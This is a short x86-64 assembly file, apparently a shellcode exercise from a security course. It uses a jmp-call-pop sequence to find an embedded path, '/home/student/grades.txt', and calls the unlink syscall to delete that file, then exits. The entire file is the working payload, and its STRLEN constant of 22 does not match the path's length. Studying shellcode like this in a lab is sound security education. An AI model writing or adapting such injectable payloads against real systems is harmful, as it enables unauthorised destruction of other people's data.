#include <sys/syscall.h>

#define STRING	"/home/student/grades.txt"
#define STRLEN	22

.globl main
	.type	main, @function

main:
    jmp calladdr

popladdr:
    popq    %rdi                   # Pop address of STRING into RDI (1st argument for unlink)
    xorq    %rax, %rax              # Clear RAX
    movq    $SYS_unlink, %rax       # System call: unlink (87)
    syscall                         # Invoke syscall

    # Exit cleanly
    movq    $SYS_exit, %rax         # System call: exit (60)
    xorq    %rdi, %rdi              # Exit status 0
    syscall                         # Invoke syscall

calladdr:
    call popladdr
    .asciz STRING                   # Null-terminated string "/home/student/grades.txt"
